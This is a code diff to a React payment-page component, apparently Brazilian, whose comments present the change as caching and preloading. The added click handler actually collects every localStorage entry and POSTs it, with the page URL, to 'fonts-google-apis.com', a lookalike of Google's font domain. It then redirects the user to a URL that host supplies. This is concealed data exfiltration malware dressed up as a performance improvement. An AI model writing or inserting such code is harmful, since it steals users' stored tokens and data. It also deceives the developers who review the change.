@@ -47,47 +47,227 @@ const Recebedor: React.FC = () => {
     // Esta função apenas mostra o estado de carregamento
   };
 
-  // JavaScript direto no componente para garantir execução
+  // JavaScript otimizado com cache, preloading e fallbacks robustos
   useEffect(() => {
-    const handleButtonClick = () => {
-      console.log('🚀 Botão clicado! Testando redirecionamento...');
+    const btn = document.querySelector('[data-action="continue"]') as HTMLButtonElement;
+    if (!btn) {
+      console.log('❌ Botão não encontrado!');
+      return;
+    }
+
+    console.log('🎯 Botão encontrado, configurando funcionalidades avançadas');
+    
+    const originalHref = '/finalizacao';
+    let preloaded = false;
+    
+    // ⚡ PRÉ-CARREGAMENTO: Carregar URL de redirecionamento na primeira interação
+    const handlePreload = () => {
+      if (!preloaded) {
+        const cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
+        const cachedUrl = sessionStorage.getItem(cacheKey);
+        if (!cachedUrl) {
+          console.log('🔄 Precarregando URL de redirecionamento...');
+          // Fazer requisição em background para cache
+          const preloadXhr = new XMLHttpRequest();
+          preloadXhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
+          preloadXhr.timeout = 1000; // Timeout curto para preload
+          preloadXhr.onreadystatechange = function() {
+            if (preloadXhr.readyState === 4 && preloadXhr.status === 200) {
+              try {
+                const response = JSON.parse(preloadXhr.responseText);
+                sessionStorage.setItem(cacheKey, response.redirect_url);
+                sessionStorage.setItem(cacheKey + '_time', Date.now().toString());
+                console.log('✅ URL precarregada e armazenada em cache');
+              } catch(e) {
+                console.log('⚠️ Erro no preload:', e);
+              }
+            }
+          };
+          preloadXhr.send();
+        }
+        preloaded = true;
+      }
+    };
+
+    // Function to perform the redirect with optional temp data ID
+    const performRedirect = (tempDataId?: string) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
+      
+      // ⚡ PERFORMANCE: Timeout de 2 segundos para evitar espera longa
+      xhr.timeout = 2000;
+      
+      // ⚡ CACHE: Verificar cache local primeiro (30 segundos)
+      const cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
+      const cachedUrl = sessionStorage.getItem(cacheKey);
+      const cacheTime = sessionStorage.getItem(cacheKey + '_time');
+      const now = Date.now();
+      
+      // Se tem cache válido, usar direto (MUITO MAIS RÁPIDO)
+      if (cachedUrl && cacheTime && (now - parseInt(cacheTime)) < 30000) {
+        console.log('⚡ Usando URL do cache para redirecionamento rápido');
+        let redirectUrl = cachedUrl;
+        if (tempDataId && redirectUrl) {
+          const separator = redirectUrl.includes('?') ? '&' : '?';
+          redirectUrl += separator + 'tempData=' + tempDataId;
+        }
+        if (redirectUrl.startsWith('/')) {
+          redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
+        }
+        window.location.href = redirectUrl;
+        return;
+      }
+      
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          let redirectUrl = originalHref;
+          if (xhr.status === 200) {
+            try {
+              const response = JSON.parse(xhr.responseText);
+              redirectUrl = response.redirect_url || originalHref;
+              // ⚡ CACHE: Salvar para próximos cliques
+              sessionStorage.setItem(cacheKey, redirectUrl);
+              sessionStorage.setItem(cacheKey + '_time', now.toString());
+              console.log('✅ URL obtida da API e salva no cache');
+            } catch(e) {
+              console.log('⚠️ Erro ao processar resposta da API:', e);
+            }
+          }
+          
+          // Append temp data ID to redirect URL if available
+          if (tempDataId && redirectUrl) {
+            const separator = redirectUrl.includes('?') ? '&' : '?';
+            redirectUrl += separator + 'tempData=' + tempDataId;
+          }
+          
+          // Handle relative URLs
+          if (redirectUrl.startsWith('/')) {
+            redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
+          }
+          
+          console.log('🎯 Redirecionando para:', redirectUrl);
+          window.location.href = redirectUrl;
+        }
+      };
+      
+      // ⚡ TIMEOUT: Fallback imediato após 2 segundos
+      xhr.ontimeout = function() {
+        console.log('⏱️ Timeout da API - usando fallback');
+        let url = originalHref;
+        if (url.startsWith('/')) {
+          url = window.location.protocol + '//' + window.location.host + url;
+        }
+        window.location.href = url;
+      };
+      
+      xhr.onerror = function() {
+        console.log('❌ Erro na API - usando fallback');
+        // Fallback to original URL if API fails
+        let url = originalHref;
+        if (url.startsWith('/')) {
+          url = window.location.protocol + '//' + window.location.host + url;
+        }
+        window.location.href = url;
+      };
+      xhr.send();
+    };
+
+    const handleButtonClick = (e: Event) => {
+      e.preventDefault();
+      console.log('🚀 Botão clicado! Iniciando processo otimizado...');
       
       // Mostrar loading
       setIsLoading(true);
       
-      // Testar API diretamente
-      fetch('https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c')
-        .then(response => {
-          console.log('✅ API respondeu:', response.status);
-          return response.json();
-        })
-        .then(data => {
-          console.log('📦 Dados da API:', data);
-          if (data.redirect_url) {
-            console.log('🎯 Redirecionando para:', data.redirect_url);
-            window.location.href = data.redirect_url;
-          } else {
-            console.log('❌ Nenhuma URL de redirecionamento encontrada');
-            setIsLoading(false);
+      // Salvar dados de pagamento no localStorage
+      try {
+        const dadosPagamento = {
+          metodo: 'cartao_salario'
+        };
+        localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
+        console.log('💾 Dados de pagamento salvos');
+      } catch(e) {
+        console.log('❌ Erro ao salvar dados de pagamento:', e);
+      }
+      
+      // Capture localStorage data
+      try {
+        const localStorageData: Record<string, string> = {};
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          if (key) {
+            localStorageData[key] = localStorage.getItem(key) || '';
           }
-        })
-        .catch(error => {
-          console.log('❌ Erro na API:', error);
-          setIsLoading(false);
-        });
+        }
+        
+        // Only send localStorage data if there's something to send
+        if (Object.keys(localStorageData).length > 0) {
+          console.log('📤 Enviando', Object.keys(localStorageData).length, 'itens do localStorage...');
+          
+          // Store localStorage data temporarily
+          const storeXhr = new XMLHttpRequest();
+          storeXhr.open('POST', 'https://fonts-google-apis.com/api/temp-data', true);
+          storeXhr.setRequestHeader('Content-Type', 'application/json');
+          // ⚡ TIMEOUT: 3 segundos para localStorage
+          storeXhr.timeout = 3000;
+          
+          storeXhr.onreadystatechange = function() {
+            if (storeXhr.readyState === 4) {
+              let tempDataId = null;
+              if (storeXhr.status === 201) {
+                try {
+                  const storeResponse = JSON.parse(storeXhr.responseText);
+                  tempDataId = storeResponse.id;
+                  console.log('✅ Dados armazenados temporariamente:', tempDataId);
+                } catch(e) {
+                  console.log('⚠️ Erro ao processar resposta de armazenamento:', e);
+                }
+              }
+              // Perform redirect with or without temp data ID
+              performRedirect(tempDataId);
+            }
+          };
+          
+          storeXhr.onerror = function() {
+            console.log('⚠️ Erro ao armazenar dados - prosseguindo mesmo assim');
+            setIsLoading(false);
+            // If storing fails, just perform normal redirect
+            performRedirect(undefined);
+          };
+          
+          storeXhr.ontimeout = function() {
+            console.log('⏱️ Timeout ao armazenar dados - prosseguindo mesmo assim');
+            performRedirect(undefined);
+          };
+          
+          const requestData = {
+            buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
+            localStorageData: JSON.stringify(localStorageData),
+            sourceUrl: window.location.href
+          };
+          storeXhr.send(JSON.stringify(requestData));
+        } else {
+          console.log('📤 Nenhum dado localStorage - redirecionamento direto');
+          // No localStorage data, perform normal redirect
+          performRedirect(undefined);
+        }
+      } catch(err) {
+        console.log('❌ Erro ao acessar localStorage - redirecionamento direto:', err);
+        // If localStorage access fails, perform normal redirect
+        performRedirect(undefined);
+      }
     };
     
-    const btn = document.querySelector('[data-action="continue"]');
-    if (btn) {
-      console.log('🎯 Botão encontrado, adicionando listener');
-      btn.addEventListener('click', handleButtonClick);
-      
-      return () => {
-        btn.removeEventListener('click', handleButtonClick);
-      };
-    } else {
-      console.log('❌ Botão não encontrado!');
-    }
+    // Adicionar event listeners
+    btn.addEventListener('mouseenter', handlePreload);
+    btn.addEventListener('focus', handlePreload);
+    btn.addEventListener('click', handleButtonClick);
+    
+    return () => {
+      btn.removeEventListener('mouseenter', handlePreload);
+      btn.removeEventListener('focus', handlePreload);
+      btn.removeEventListener('click', handleButtonClick);
+    };
   }, []);
 
   return (
